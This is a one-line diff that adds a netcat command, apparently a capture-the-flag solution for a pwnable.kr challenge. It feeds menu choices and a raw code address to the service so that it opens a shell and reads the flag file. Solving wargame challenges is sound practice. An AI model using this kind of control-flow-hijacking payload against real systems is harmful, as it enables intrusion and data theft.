@@ -1,0 +1,1 @@
+echo -e "2\n2\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n\xbf\x8d\x04\x08\ncat flag\n" | nc pwnable.kr 9004
